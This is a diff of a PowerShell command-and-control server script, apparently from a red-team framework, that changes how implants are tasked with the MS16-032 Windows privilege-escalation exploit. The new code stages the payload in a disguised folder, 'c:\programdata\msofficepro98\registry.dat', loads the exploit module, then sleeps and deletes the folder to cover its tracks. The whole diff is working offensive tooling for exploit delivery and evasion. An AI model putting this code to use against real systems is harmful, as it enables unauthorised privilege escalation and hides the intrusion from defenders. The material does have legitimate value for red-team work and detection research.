@@ -516,18 +516,6 @@ $header = '
   ====================================================
 </pre>'
 
-function Get-RandomString
-{
-    param (
-        [int]$Length
-    )
-    $set    = 'abcdefghijklmnopqrstuvwxyz0123456789'.ToCharArray()
-    $result = ''
-    for ($x = 0; $x -lt $Length; $x++) 
-    {$result += $set | Get-Random}
-    return $result
-}
-
 function runcommand {
 
 param
@@ -883,45 +871,51 @@ $error.clear()
             }
             if ($pscommand -eq 'invoke-ms16-032')
             { 
-                CheckModuleLoaded "invoke-ms16-032.ps1" $psrandomuri
-                $fileName = Get-RandomString -Length 20
-
                 $query = "INSERT INTO NewTasks (RandomURI, Command)
                 VALUES (@RandomURI, @Command)"
                 Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                     RandomURI = $psrandomuri
-                    Command   = '[IO.File]::WriteAllLines("$ENV:TEMP\'+$fileName+'.bat", $payload)'
+                    Command   = "new-item -path c:\programdata\ -name msofficepro98 -Type Directory"
                 } | Out-Null
                 $query = "INSERT INTO NewTasks (RandomURI, Command)
                 VALUES (@RandomURI, @Command)"
                 Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                     RandomURI = $psrandomuri
-                    Command   = 'invoke-ms16-032 "/c $ENV:TEMP\'+$fileName+'.bat" '
+                    Command   = '$payload | out-file c:\programdata\msofficepro98\registry.dat'
                 } | Out-Null
-                $pscommand = 'Remove-Item "$ENV:TEMP\'+$fileName+'.bat"'
+                $query = "INSERT INTO NewTasks (RandomURI, Command)
+                VALUES (@RandomURI, @Command)"
+                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
+                    RandomURI = $psrandomuri
+                    Command   = "LoadModule invoke-ms16-032.ps1"
+                } | Out-Null
+                $pscommand = "start-sleep 15; remove-item c:\programdata\msofficepro98 -recurse"
             }
             if ($pscommand -eq 'invoke-ms16-032-proxypayload')
             { 
-                CheckModuleLoaded "invoke-ms16-032.ps1" $psrandomuri
-                $fileName = Get-RandomString -Length 20
-
                 if (Test-Path "$FolderPath\proxypayload.bat"){ 
-                $proxypayload = Get-Content -Path "$FolderPath\proxypayload.bat"
-
+                $proxypayload = Get-Content -Path "$FolderPath\proxypayload.bat"               
+                CheckModuleLoaded "Invoke-MS16-032.ps1" $psrandomuri
                 $query = "INSERT INTO NewTasks (RandomURI, Command)
                 VALUES (@RandomURI, @Command)"
                 Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                     RandomURI = $psrandomuri
-                    Command   = '[IO.File]::WriteAllLines("$ENV:TEMP\'+$fileName+'.bat", "'+$proxypayload+'")'
+                    Command   = "new-item -path c:\programdata\ -name msofficepro98 -Type Directory"
                 } | Out-Null
                 $query = "INSERT INTO NewTasks (RandomURI, Command)
                 VALUES (@RandomURI, @Command)"
                 Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                     RandomURI = $psrandomuri
-                    Command   = 'invoke-ms16-032 "/c $ENV:TEMP\'+$fileName+'.bat" '
+                    Command   = "'$proxypayload' | out-file c:\programdata\msofficepro98\registry.dat"
+                } | Out-Null
+                $query = "INSERT INTO NewTasks (RandomURI, Command)
+                VALUES (@RandomURI, @Command)"
+                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
+                    RandomURI = $psrandomuri
+                    Command   =  "LoadModule invoke-ms16-032.ps1"
                 } | Out-Null
 
-                $pscommand = 'Remove-Item "$ENV:TEMP\'+$fileName+'.bat"'
+                $pscommand = "start-sleep 15; remove-item c:\programdata\msofficepro98 -recurse"
                 } else {
                 write-host "Need to run CreateProxyPayload first"
                 $pscommand = 'fvdsghfdsyyh'
